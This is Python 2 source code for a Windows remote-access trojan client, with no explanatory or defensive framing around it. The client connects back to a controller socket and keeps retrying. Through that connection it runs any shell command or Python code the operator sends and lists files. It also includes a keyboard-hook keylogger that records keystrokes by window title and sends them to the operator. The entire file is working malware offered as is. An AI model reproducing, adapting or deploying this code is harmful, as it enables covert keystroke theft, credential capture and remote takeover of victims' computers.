# -*- coding: utf-8 -*-
#!/usr/bin/python

import socket
import time
import os
import subprocess
import threading
from ctypes import *
from ctypes.wintypes import MSG

HOST = '127.0.0.1'
PORT = 4434
active = False
printf = ''
hooked = {}
loggingState = False


def Send(sock, cmd, end="[ENDOFMESSAGE]"):
    sock.sendall((cmd + end).encode('utf-8'))


def Receive(sock, end="[ENDOFMESSAGE]"):
    data = ""
    l = sock.recv(1024)
    while l:
        data = data + l
        if data.endswith(end):
            break
        else:
            l = sock.recv(1024)
    return data[:-len(end)].decode('utf-8')

# START: Keylogger
def GetWindowTitle():
    GetForegroundWindow = windll.user32.GetForegroundWindow
    GetWindowTextLength = windll.user32.GetWindowTextLengthW
    GetWindowText = windll.user32.GetWindowTextW
    HWND = GetForegroundWindow()
    length = GetWindowTextLength(HWND)
    buff = create_unicode_buffer(length + 1)
    GetWindowText(HWND, buff, length + 1)
    return buff.value

class KeyLogger:
    def __init__(self, user32, kernel32):
        self.lUser32 = user32
        self.lKernel32 = kernel32
        self.hooked = None

    # Start Hooking
    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(13, pointer, self.lKernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True

    # Stop Hooking
    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


class Key(threading.Thread):
    def __init__(self):
        super(Key, self).__init__()

        self.shiftcodes = {
            '49': '!', # 1
            '50': '@', # 2
            '51': '#', # 3
            '52': '$', # 4
            '53': '%', # 5
            '54': '^', # 6
            '55': '&', # 7
            '56': '*', # 8
            '57': '(', # 9
            '48': ')', # 0
            '45': '_', # -
            '61': '+', # =
        }

        self.user32 = windll.user32
        self.kernel32 = windll.kernel32

    def updateKey(self, k):
        if k == 189:
            return '45' # -
        elif k == 187:
            return '61' # =
        elif k == 219:
            return '91' # [
        elif k == 221:
            return '93' # ]
        else:
            return str(k)

    def getFPTR(self, fn):
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        return CMPFUNC(fn)

    def hookProc(self, nCode, wParam, lParam):

        if wParam is not 0x0100:
            return self.user32.CallNextHookEx(self.keyLogger.hooked, nCode, wParam, lParam)

        # send key
        global hooked

        if hooked.has_key(GetWindowTitle()):
            if self.user32.GetKeyState(0x14) & 1:
                if self.user32.GetKeyState(0x10) & 0x8000:
                    if self.shiftcodes.has_key(self.updateKey(lParam[0])):
                        hooked[GetWindowTitle()] += ' '+self.updateKey(ord(self.shiftcodes[self.updateKey(lParam[0])]))
                    else:
                        hooked[GetWindowTitle()] += ' '+self.updateKey(ord(chr(lParam[0]).lower()))
                else:
                    hooked[GetWindowTitle()] += ' '+self.updateKey(lParam[0])
            else:
                if self.user32.GetKeyState(0x10) & 0x8000:
                    if self.shiftcodes.has_key(self.updateKey(lParam[0])):
                        hooked[GetWindowTitle()] += ' '+self.updateKey(ord(self.shiftcodes[self.updateKey(lParam[0])]))
                    else:
                        hooked[GetWindowTitle()] += ' '+self.updateKey(lParam[0])
                else:
                    hooked[GetWindowTitle()] += ' '+self.updateKey(ord(chr(lParam[0]).lower()))
        else:
            if self.user32.GetKeyState(0x14) & 1:
                if self.user32.GetKeyState(0x10) & 0x8000:
                    if self.shiftcodes.has_key(self.updateKey(lParam[0])):
                        hooked[GetWindowTitle()] = self.updateKey(ord(self.shiftcodes[self.updateKey(lParam[0])]))
                    else:
                        hooked[GetWindowTitle()] = self.updateKey(ord(chr(lParam[0]).lower()))
                else:
                    hooked[GetWindowTitle()] = self.updateKey(lParam[0])
            else:
                if self.user32.GetKeyState(0x10) & 0x8000:
                    if self.shiftcodes.has_key(self.updateKey(lParam[0])):
                        hooked[GetWindowTitle()] = self.updateKey(ord(self.shiftcodes[self.updateKey(lParam[0])]))
                    else:
                        hooked[GetWindowTitle()] = self.updateKey(lParam[0])
                else:
                    hooked[GetWindowTitle()] = self.updateKey(ord(chr(lParam[0]).lower()))

        # check if client is alive
        if not active:
            self.keyLogger.uninstallHookProc()
            return 'clientTerminated'

        # stop keylogging
        global loggingState
        if not loggingState:
            self.keyLogger.uninstallHookProc()
        return self.user32.CallNextHookEx(self.keyLogger.hooked, nCode, wParam, lParam)

    def startKeyLog(self): #(8)
        msg = MSG()
        self.user32.GetMessageA(byref(msg),0,0,0)

    def run(self):
        self.keyLogger = KeyLogger(self.user32, self.kernel32)
        self.pointer = self.getFPTR(self.hookProc)

        if self.keyLogger.installHookProc(self.pointer):
            pass

        self.startKeyLog()

def stopLogging():
    global loggingState
    global hooked
    hooked = {}
    loggingState = False
    return 'Keylogger Stoped'

def startLogging():
    global loggingState
    loggingState = True
    loggingThread = Key()
    loggingThread.start()
    return 'Keylogger Started'

def SendKeyStokes():
    global hooked
    keyStokes = str(hooked)
    hooked = {}
    return keyStokes


# END: Keylogger

def Execute(source):
    try:
        exec source
        if printf == '':
            return 'No output<br>example: printf = "SOME TEXT OR VARIABLE"'
        return str(printf)
    except Exception as e:
        return str(e)


def Exec(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return '<font color="red">SERVER ERROR: </font>' + str(e)

    else:
        return "Enter a command.\n"

def fromAutostart():
    global active
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            data = Receive(s)
            if data == 'Activate':
                active = True
                Send(s, '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>')

            while active:
                data = Receive(s)
                if data == '':
                    time.sleep(0.02)
                if data == "quit" or data == "terminate":
                    print 'terminated'
                    Send(s, "quitted")
                    active = False
                    break
                elif data.startswith("cd "):
                    try:
                        os.chdir(data[3:])
                        stdoutput = ""
                    except:
                        stdoutput = "Error opening directory.\n"
                elif data.startswith(("Activate")):
                    stdoutput = ''
                elif data.startswith("runscript"):
                    stdoutput = Execute(data[10:])
                elif data.startswith("StartLogging"):
                    stdoutput = startLogging()
                elif data.startswith("StopLogging"):
                    stdoutput = stopLogging()
                elif data.startswith("GiveMeKeyStokes"):
                    stdoutput = SendKeyStokes()
                elif data.startswith("ls"):
                    string = {}
                    try:
                        for n, i in enumerate(os.listdir(u'.')):
                            string[n] = {}
                            string[n]['name'] = i
                            string[n]['type'] = os.path.isfile(i)
                        stdoutput = str(string)
                    except WindowsError:
                        stdoutput = 'Access is denied'
                else:
                    stdoutput = Exec(data)
                stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
                Send(s, stdoutput)
            if data == "terminate":
                break
            time.sleep(3)
        except socket.error:
            s.close()
            time.sleep(10)
            continue


fromAutostart()